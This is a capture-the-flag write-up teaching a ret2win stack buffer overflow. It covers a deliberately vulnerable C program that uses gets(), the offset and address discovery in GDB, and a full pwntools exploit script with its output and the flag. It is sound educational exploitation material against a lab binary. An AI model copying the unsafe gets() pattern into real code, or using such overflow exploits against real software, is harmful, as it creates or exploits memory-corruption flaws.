---
title: "Pwn - Return to Win"
description: "Overflowing the return address to redirect execution to a win() function — your first real control-flow hijack."
author: "Zemi"
---

## Challenge Info

| Detail     | Value                          |
|------------|--------------------------------|
| Category   | Binary Exploitation            |
| Difficulty | Medium                         |
| Points     | 200                            |
| Flag       | `zemi{r3t2w1n_f1rst_st3p}`     |

## Challenge Files

Download the challenge files to get started:

- [ret2win.c](/Website/challenges/pwn-ret2win/ret2win.c)
- [Makefile](/Website/challenges/pwn-ret2win/Makefile)
- [flag.txt](/Website/challenges/pwn-ret2win/flag.txt)

## Introduction

In the previous Baby Buffer Overflow challenge, we overwrote a local variable to change program behavior. This time there is no convenient `check` variable sitting on the stack. Instead, we need to take full control of execution by overwriting the **return address** — the address the CPU jumps to when a function finishes. This technique is called **ret2win**: we redirect the return to a `win()` function that already exists in the binary.

## Understanding the Stack Frame

Every time a function is called on x86-64, the CPU pushes the return address onto the stack, then the called function pushes the old base pointer (`rbp`). Local variables are allocated below that. The layout looks like this:

```
High addresses
+---------------------------+
| caller's stack frame      |
+---------------------------+
| return address (8 bytes)  |  <-- saved RIP, pushed by `call`
+---------------------------+
| saved RBP (8 bytes)       |  <-- pushed by `push rbp`
+---------------------------+
| local variables           |  <-- buffer lives here
+---------------------------+
Low addresses (stack grows down)
```

If we can write past the local variables, we overwrite the saved RBP, and then the return address. When the function executes `ret`, it pops our controlled value into RIP and jumps there.

## Vulnerable Source Code

```c
#include <stdio.h>
#include <string.h>
#include <stdlib.h>

// Compiled: gcc -no-pie -fno-stack-protector -o ret2win ret2win.c

void win() {
    FILE *f = fopen("flag.txt", "r");
    if (f == NULL) {
        printf("flag.txt not found!\n");
        exit(1);
    }
    char flag[64];
    fgets(flag, 64, f);
    printf("Congratulations! %s\n", flag);
    fclose(f);
}

void vuln() {
    char buffer[64];
    printf("Tell me your name: ");
    gets(buffer);
    printf("Thanks, %s!\n", buffer);
}

int main() {
    printf("=== Ret2Win Challenge ===\n");
    vuln();
    return 0;
}
```

Key observations:
- `win()` exists in the binary but is **never called** by normal program flow
- `vuln()` uses `gets()`, giving us an unbounded write into a 64-byte buffer
- Compiled with `-no-pie` (fixed addresses) and `-fno-stack-protector` (no canaries)

## Step 1 — Find the win() Address

Since the binary is compiled without PIE, function addresses are fixed. We can find `win()` with several tools:

```bash
objdump -d ret2win | grep '<win>'
```

```
0000000000401196 <win>:
```

Or using GDB:

```bash
gdb ./ret2win
```

```gdb
(gdb) info functions win
All functions matching regular expression "win":

Non-debugging symbols:
0x0000000000401196  win
```

Or with pwntools in Python:

```python
from pwn import *
elf = ELF('./ret2win')
print(hex(elf.symbols['win']))  # 0x401196
```

The address of `win()` is `0x401196`.

## Step 2 — Calculate the Offset to the Return Address

We need to know exactly how many bytes to write before we reach the saved return address. We use a **cyclic pattern** (De Bruijn sequence) to determine this.

```bash
gdb ./ret2win
```

```gdb
(gdb) run <<< $(python3 -c "from pwn import *; print(cyclic(200).decode())")
```

The program crashes with a segfault. Let's check what value RSP points to (the address that `ret` tried to jump to):

```gdb
(gdb) x/gx $rsp
0x7fffffffe3a8:	0x6161617461616173
```

Or check RBP:

```gdb
(gdb) info registers rbp
rbp  0x6161617361616172
```

Now find the offset:

```python
from pwn import *
# The value that overwrote the return address
offset = cyclic_find(0x6161617461616173)
print(f"Offset to return address: {offset}")  # 72
```

Breaking this down:
- Buffer is 64 bytes
- Saved RBP is 8 bytes (we overwrite this too)
- Total: 64 + 8 = **72 bytes** of padding before the return address

Let's verify in GDB by disassembling `vuln()`:

```gdb
(gdb) disas vuln
Dump of assembler code for function vuln:
   0x00000000004011d5 <+0>:     push   rbp
   0x00000000004011d6 <+1>:     mov    rbp,rsp
   0x00000000004011d9 <+4>:     sub    rsp,0x40            # 0x40 = 64 bytes for buffer
   0x00000000004011dd <+8>:     lea    rdi,[rip+0xe24]
   0x00000000004011e4 <+15>:    mov    eax,0x0
   0x00000000004011e9 <+20>:    call   0x401040 <printf@plt>
   0x00000000004011ee <+25>:    lea    rax,[rbp-0x40]      # buffer at rbp-0x40
   0x00000000004011f2 <+29>:    mov    rdi,rax
   0x00000000004011f5 <+32>:    call   0x401060 <gets@plt>
   ...
   0x0000000000401209 <+52>:    leave
   0x000000000040120a <+53>:    ret
```

- Buffer starts at `rbp - 0x40` (64 bytes below rbp)
- The saved RBP is at `rbp + 0x0` (8 bytes)
- The return address is at `rbp + 0x8`
- Distance from buffer start to return address: `0x40 + 8 = 72 bytes`

## Step 3 — Stack Alignment on x86-64

On x86-64, the System V ABI requires the stack to be **16-byte aligned** before a `call` instruction. If `win()` calls functions like `printf` or `fopen`, and the stack is misaligned, the program may crash with a segfault inside a `movaps` instruction.

The fix is simple: instead of jumping directly to `win()`, we jump to a `ret` gadget first. This pops an extra 8 bytes off the stack, realigning it to 16 bytes.

Find a `ret` gadget:

```bash
objdump -d ret2win | grep -m1 "ret$"
```

```
  40101a:       c3                      ret
```

Our payload will be: `padding (72 bytes) + ret gadget + win() address`.

## Step 4 — Craft the Exploit

```python
from pwn import *

# Addresses
ret_gadget = 0x40101a  # a simple `ret` instruction for stack alignment
win_addr   = 0x401196

# Build payload
payload  = b"A" * 72          # fill buffer (64) + saved RBP (8)
payload += p64(ret_gadget)    # align the stack
payload += p64(win_addr)      # overwrite return address with win()

# Test locally
with open("payload.bin", "wb") as f:
    f.write(payload)
```

```bash
./ret2win < payload.bin
```

```
=== Ret2Win Challenge ===
Tell me your name: Thanks, AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA!
Congratulations! zemi{r3t2w1n_f1rst_st3p}
```

## Full pwntools Solve Script

```python
from pwn import *

# Load the binary
elf = ELF('./ret2win')
context.binary = elf

# Find addresses
win_addr = elf.symbols['win']
log.info(f"win() @ {hex(win_addr)}")

# Find a ret gadget for stack alignment
rop = ROP(elf)
ret_gadget = rop.find_gadget(['ret'])[0]
log.info(f"ret gadget @ {hex(ret_gadget)}")

# Calculate offset (64-byte buffer + 8-byte saved RBP)
offset = 72

# Build payload
payload  = b"A" * offset
payload += p64(ret_gadget)   # stack alignment
payload += p64(win_addr)     # jump to win()

# Run locally
p = process('./ret2win')
p.sendlineafter(b"name: ", payload)

# Receive the flag
output = p.recvall(timeout=2).decode()
print(output)

p.close()
```

```
[*] win() @ 0x401196
[*] ret gadget @ 0x40101a
[+] Starting local process './ret2win': pid 12345
[+] Receiving all data: Done (50B)
[*] Process './ret2win' stopped with exit code 0
Thanks, AAAAAAAAAA...!
Congratulations! zemi{r3t2w1n_f1rst_st3p}
```

## Why This Works — The Full Picture

Here is what happens step by step:

1. `vuln()` allocates 64 bytes for `buffer` on the stack
2. `gets()` reads our input with no length check
3. We write 64 bytes of `A`s that fill the buffer
4. The next 8 bytes of `A`s overwrite the saved RBP (we don't care about it)
5. The `ret` gadget address overwrites the original return address
6. When `vuln()` executes `leave; ret`, it pops our `ret` gadget into RIP
7. The `ret` gadget executes, popping `win()` address into RIP
8. Execution lands in `win()`, which reads and prints the flag

## Tools Used

- **GDB** — disassemble functions, inspect registers, find crash offsets
- **objdump** — locate function addresses and gadgets in the binary
- **pwntools** — cyclic patterns, address packing, ROP gadget finding, process interaction
- **Python** — scripting the exploit

## Lessons Learned

- Overwriting the **return address** gives you full control of execution flow, not just variable values
- The **saved RBP** sits between your buffer and the return address — account for it (8 bytes on x86-64)
- **Stack alignment** matters on x86-64: use a `ret` gadget to realign before calling functions that use SSE instructions
- **PIE disabled** (`-no-pie`) means addresses are fixed and predictable — real binaries often have PIE enabled, which requires an info leak first
- **No stack canary** (`-fno-stack-protector`) means there is no guard value between the buffer and saved RBP — with canaries enabled, you would need to leak or brute-force the canary value
- This is the foundation for more advanced techniques like ret2libc and ROP chains
